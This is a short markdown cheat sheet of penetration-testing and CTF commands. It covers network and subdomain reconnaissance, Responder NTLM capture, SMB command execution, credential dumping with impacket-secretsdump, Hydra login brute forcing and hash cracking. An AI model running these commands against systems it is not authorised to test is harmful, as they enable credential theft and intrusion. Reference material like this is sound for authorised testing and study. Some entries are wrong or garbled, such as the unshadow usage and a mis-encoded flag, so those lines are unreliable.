## Pentest
Commands used on pentests or CTF's. Some of it can be outdated or wrong, so always check the docs/help of each command for detail.

### Recon
* `nmap -D RND:20 --open -sS -sV -v -Pn --top-ports 100 -oN arquivo domain/ip `
* `wfuzz -c -f sub-fighter.txt -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://cyprusbank.thm' -H "Host: FUZZ.cyprusbank.thm" --hw 3 -v` - subdomain fuzzing
* `wfuzz -w wordlist -u URL -H 'Host: FUZZ.site.com' --hc 400,404 -t 150 -c` - subdomain fuzzing
* `whatweb -a 4` - website technologies enumeration
* `nikto -host IP -Display 3 -evasion 1,4 -followredirects -o nikto.txt -port 999 -Pause 999 -useragent pentest` - plugins can be used individually with the flag `-Plugins "name;name"`
* `netdiscover` - discover active hosts on local network, similar to `nmap -sn`
* `netexec smb 1.1.1.1/24 -u user -p password -x command` - discover local SMB clients on Windows enviroments and try to run a command with authenticated user
* `sudo responder -I eth0 -v` - listen and respond for LLMNR, MDNS and NTB-NS protocols to obtain NTLM credentials
* `rpcclient -W domain -U user 10.0.0.1` - connect on rpc
* `impacket-secretsdump domain/user:'pass'@10.1.1.1` - dump credentials from host

### Brute Force
* `hydra -v -t10 -l user -P password_wordlist.txt service -s port` - service (as ssh, ftp) brute force using password wordlist
* `hydra -l user -P /wordlist/file.txt IP http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid" -V` - POST request brute force. To obtain the parameters, login once using a proxy (such as burp suite), intercept the request and copy the values to the command. `F=Username or password invalid` is a string returned on the "failed login" page. Use --help for detail
* `crunch 10 10 -t password^%% -o file` and `cewl dominio.com.br -m 5` - create password mutations
* `hash-identifier HASH` - identify hash
* `john --wordlist= --format= hash_file` - brute force password hash
* `hashcat -m 100 hash_file /wordlist/path â€”force` - brute force password hash
* `impacket-secretdump -sam sam_file -system system_file LOCAL`
* `unshadow system sam`


